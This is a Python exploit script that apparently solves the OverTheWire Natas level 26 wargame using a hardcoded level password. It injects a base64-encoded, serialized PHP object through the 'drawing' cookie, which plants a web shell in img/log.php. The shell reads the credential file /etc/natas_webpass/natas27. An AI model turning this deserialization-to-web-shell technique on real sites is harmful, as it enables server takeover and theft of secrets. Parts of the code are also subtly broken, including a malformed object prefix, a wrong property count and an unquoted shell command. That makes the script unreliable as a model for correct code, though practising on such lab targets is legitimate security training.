import requests
from requests.auth import HTTPBasicAuth
from requests.sessions import RequestsCookieJar
import string
import random
import base64


def receive_response(_payload):
    auth_username = 'natas25'
    auth_password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T' 
    response = requests.post('http://natas26.natas.labs.overthewire.org/', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    return response

# receive a requests.Response object and dissect it
def dissect_response(response):

    print("Encoding: " + response.apparent_encoding)
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))



def exploit():
    sess = requests.Session()
    auth_username = 'natas26'
    auth_password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'

    _payload = 'x1=1&y1=1&x2=10&y2=10'
    response = sess.get('http://natas26.natas.labs.overthewire.org/?' + _payload, auth=HTTPBasicAuth(auth_username, auth_password))
        
    
    print(sess.cookies)
    print("----------------------")


    php_payload = '<?php echo passthru(cat /etc/natas_webpass/natas27); ?>'
    class_name = "Logger"
    initMsg="LoggerinitMsg"
    log_file = "LoggerlogFile"
    log_file_name = "img/log.php"
    message = "LoggerexitMsg"

    payload = '0:'+str(len(class_name))+':"'+class_name+'":3:{s:'+str(len(log_file))+':"'+log_file+'";s:'+str(len(log_file_name))+':"'+log_file_name+'";s:'+str(len(initMsg))+':"'+initMsg+'";s:'+str(len('hi'))+':"hi";s:'+str(len(message))+':"'+message+'";s:'+str(len(php_payload))+':"'+php_payload+'"}'
    print(payload + "\n" + str(len(payload)) + "\n-----------------\n")
    payload = payload.encode("ascii")
    payload_bytes = base64.b64encode(payload)
    payload_string = payload_bytes.decode("ascii")
    print(payload_string)
    sess.cookies.set("drawing", value=payload_string, domain="natas26.natas.labs.overthewire.org", path="/")
    print(sess.cookies)

    response = sess.get('http://natas26.natas.labs.overthewire.org', auth=HTTPBasicAuth(auth_username, auth_password))
    dissect_response(response)

    response = sess.get('http://natas26.natas.labs.overthewire.org/img/log.php', auth=HTTPBasicAuth(auth_username, auth_password))
    dissect_response(response)



exploit()